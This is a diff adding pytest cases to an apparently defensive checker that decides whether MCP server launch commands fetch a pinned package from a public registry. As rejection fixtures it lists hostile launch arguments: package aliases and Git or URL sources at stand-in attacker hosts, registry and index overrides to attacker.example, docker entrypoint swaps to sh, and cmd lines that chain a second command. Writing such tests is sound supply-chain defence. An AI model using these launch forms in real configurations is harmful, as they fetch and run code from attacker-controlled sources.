@@ -250,6 +250,41 @@ def test_every_insecure_transport_label_is_scored(url):
             ("oci", "registry.local:5000/mcp/time", "1.0"),
         ),
         ("docker", ["run", "alpine"], ("oci", "docker.io/library/alpine", None)),
+        # Windows launcher forms.
+        ("npx.cmd", ["-y", "pkg@1.0.0"], ("npm", "pkg", "1.0.0")),
+        ("C:\\Program Files\\nodejs\\npx.CMD", ["-y", "pkg"], ("npm", "pkg", None)),
+        ("uvx.exe", ["pkg==1.0"], ("pypi", "pkg", "1.0")),
+        ("cmd", ["/c", "npx", "-y", "pkg@1.0.0"], ("npm", "pkg", "1.0.0")),
+        ("cmd.exe", ["/d", "/s", "/C", "npx -y pkg@1.0.0"], ("npm", "pkg", "1.0.0")),
+        # Options that change neither the package nor where it comes from.
+        ("npx", ["--loglevel", "silent", "pkg@1.0.0"], ("npm", "pkg", "1.0.0")),
+        ("npx", ["--loglevel=silent", "-y", "@scope/pkg@1.0.0"], ("npm", "@scope/pkg", "1.0.0")),
+        ("npx", ["-p", "@scope/tool@1.0.0", "tool", "--port", "1"], ("npm", "@scope/tool", "1.0.0")),
+        ("npx", ["-y", "pkg@>=1.0.0 <2"], ("npm", "pkg", None)),
+        ("uvx", ["--python", "3.12", "pkg"], ("pypi", "pkg", None)),
+        ("uvx", ["--python=cpython@3.12", "-q", "pkg"], ("pypi", "pkg", None)),
+        ("pipx", ["run", "--no-cache", "--spec=pkg==2.0", "pkg"], ("pypi", "pkg", "2.0")),
+        ("docker", ["run", "--gpus", "all", "ghcr.io/acme/tool:1.0"], ("oci", "ghcr.io/acme/tool", "1.0")),
+        (
+            "docker",
+            [
+                "run",
+                "-it",
+                "--gpus=all",
+                "-eNAME=x",
+                "--shm-size",
+                "1g",
+                "-a",
+                "stdin",
+                "ghcr.io/acme/tool:1.0",
+            ],
+            ("oci", "ghcr.io/acme/tool", "1.0"),
+        ),
+        (
+            "podman",
+            ["run", "--sig-proxy=false", "--tls-verify", "quay.io/acme/tool:2"],
+            ("oci", "quay.io/acme/tool", "2"),
+        ),
     ],
 )
 def test_server_package_names_the_launched_registry_package(command, args, expected):
@@ -274,10 +309,59 @@ def test_server_package_names_the_launched_registry_package(command, args, expec
         ("node", ["server.js"]),
         ("", []),
         (None, []),
+        # 'name@' followed by an alias, a Git, GitHub, URL or file source fetches something else.
+        ("npx", ["-y", "@acme/files@npm:evil-pkg@1.0.0"]),
+        ("npx", ["-y", "files@npm:evil-pkg"]),
+        ("npx", ["-y", "@acme/files@github:attacker/evil"]),
+        ("npx", ["-y", "@acme/files@https://evil.example/e.tgz"]),
+        ("npx", ["-y", "@acme/files@git+https://github.com/attacker/evil.git"]),
+        ("npx", ["-y", "@acme/files@file:../evil"]),
+        ("npx", ["-y", "@acme/files@attacker/evil#main"]),
+        # Another registry, configuration, extra package, command or unknown option.
+        ("npx", ["-y", "--registry", "https://npm.attacker.example", "@acme/files@1.2.0"]),
+        ("npx", ["-y", "--registry=https://npm.attacker.example", "@acme/files@1.2.0"]),
+        ("npx", ["--userconfig", "./npmrc", "pkg"]),
+        ("npx", ["--@acme:registry=https://npm.attacker.example", "@acme/files"]),
+        ("npx", ["-c", "evil", "-p", "pkg"]),
+        ("npx", ["-y", "-p", "evil-pkg", "-p", "pkg@1.0.0", "pkg"]),
+        ("npx", ["-y", "-p", "pkg@1.0.0", "node", "./evil.js"]),
+        ("npx", ["-y", "-p", "pkg@1.0.0"]),
+        ("pnpm", ["dlx", "--shell-mode", "pkg"]),
+        ("uvx", ["--index-url", "https://pypi.attacker.example/simple", "pkg==1.0"]),
+        ("uvx", ["--default-index", "https://pypi.attacker.example/simple", "pkg==1.0"]),
+        ("uvx", ["--extra-index-url", "https://pypi.attacker.example/simple", "pkg==1.0"]),
+        ("uvx", ["--with", "evil-pkg", "pkg==1.0"]),
+        ("uvx", ["--python", "./evil/python", "pkg"]),
+        ("uvx", ["--python=..\\python.exe", "pkg"]),
+        ("uv", ["tool", "run", "--config-file", "./uv.toml", "pkg"]),
+        ("pipx", ["run", "--pip-args=--index-url=https://x.example", "pkg"]),
+        ("pipx", ["run", "--index-url", "https://x.example", "pkg"]),
+        ("docker", ["run", "--entrypoint", "sh", "ghcr.io/acme/tool:1.0", "-c", "evil"]),
+        ("docker", ["run", "--entrypoint=sh", "ghcr.io/acme/tool:1.0"]),
+        ("docker", ["run", "--not-a-docker-option", "value", "ghcr.io/acme/tool:1.0"]),
+        ("docker", ["run", "-ie", "X=1", "ghcr.io/acme/tool:1.0"]),
+        ("cmd", ["/c", "npx -y pkg@1.0.0 & evil"]),
+        ("cmd", ["/c", "npx", "-y", "pkg", "|", "evil"]),
+        ("cmd", ["/c"]),
+        ("cmd", ["/c", "cmd", "/c", "npx", "pkg"]),
+        ("cmd", ["/k", "bash", "-c", "npx pkg"]),
     ],
 )
 def test_server_package_is_none_without_a_registry_package(command, args):
     assert server_package({"command": command, "args": args}) is None
+
+
+@pytest.mark.parametrize(
+    "name",
+    ["npm_config_registry", "NPM_CONFIG_USERCONFIG", "UV_INDEX_URL", "UV_DEFAULT_INDEX", "UV_EXTRA_INDEX_URL",
+     "UV_TOOL_DIR", "PIP_INDEX_URL", "PIPX_HOME", "DOCKER_HOST", "CONTAINER_HOST"],
+)  # fmt: skip
+def test_server_package_is_none_when_the_environment_can_change_the_source(name):
+    server = {"command": "npx", "args": ["-y", "pkg@1.0.0"], "env_names": ["GITHUB_TOKEN", name]}
+    assert server_package(server) is None
+    assert server_package({**server, "env_names": ["GITHUB_TOKEN", "NODE_ENV"]}) == PackageRef(
+        "npm", "pkg", "1.0.0"
+    )
 
 
 def test_server_package_ignores_a_remote_only_server():
@@ -313,3 +397,46 @@ def test_registry_package_normalizes_like_a_launch(kind, identifier, version, ex
 )
 def test_registry_package_rejects_what_names_no_package(kind, identifier):
     assert registry_package(kind, identifier) is None
+
+
+@pytest.mark.parametrize(
+    ("kind", "identifier", "base", "expected"),
+    [
+        ("npm", "pkg", "https://registry.npmjs.org", ("npm", "pkg", None)),
+        ("npm", "pkg", "HTTPS://registry.npmjs.org/", ("npm", "pkg", None)),
+        ("pypi", "Pkg", "https://pypi.org", ("pypi", "pkg", None)),
+        ("pypi", "pkg", "https://pypi.org/simple/", ("pypi", "pkg", None)),
+        ("oci", "ghcr.io/acme/tool:1.0", "https://ghcr.io", ("oci", "ghcr.io/acme/tool", "1.0")),
+        ("oci", "acme/tool", "https://docker.io", ("oci", "docker.io/acme/tool", None)),
+        ("oci", "acme/tool", "https://index.docker.io/", ("oci", "docker.io/acme/tool", None)),
+        ("nuget", "Acme.Tool", "https://api.nuget.org", ("nuget", "acme.tool", None)),
+        ("npm", "pkg", "https://npm.acme.internal", None),
+        ("pypi", "pkg", "https://pypi.acme.internal/simple", None),
+        ("oci", "acme/tool", "https://ghcr.io", None),
+        ("oci", "ghcr.io/acme/tool", "https://registry.acme.internal", None),
+    ],
+)
+def test_registry_package_matches_only_the_public_registry_a_launch_fetches_from(
+    kind, identifier, base, expected
+):
+    expected_ref = PackageRef(*expected) if expected is not None else None
+    assert registry_package(kind, identifier, None, base) == expected_ref
+
+
+@pytest.mark.parametrize(
+    ("command", "args", "risks"),
+    [
+        # Windows launcher names are recognized by the risk checks too.
+        ("npx.cmd", ["-y", "pkg"], ["mcp-unpinned-package"]),
+        ("cmd.exe", ["/c", "npx", "pkg"], ["mcp-shell-command"]),
+        # An alias is as pinned as the package it names; a URL with '@' in its path is not a version.
+        ("npx", ["-y", "@acme/files@npm:evil-pkg@1.0.0"], []),
+        ("npx", ["-y", "@acme/files@npm:evil-pkg"], ["mcp-unpinned-package"]),
+        ("npx", ["-y", "@acme/files@https://evil.example/p@1.0.0"], ["mcp-unpinned-package"]),
+        ("npx", ["--loglevel", "silent", "pkg@1.0.0"], []),
+        # --gpus takes a value: the image is the next argument.
+        ("docker", ["run", "--gpus", "all", "ghcr.io/acme/tool:1.0"], []),
+    ],
+)
+def test_launcher_forms_are_assessed_like_the_plain_launch(command, args, risks):
+    assert [risk.id for risk in assess_server({"command": command, "args": args})] == risks
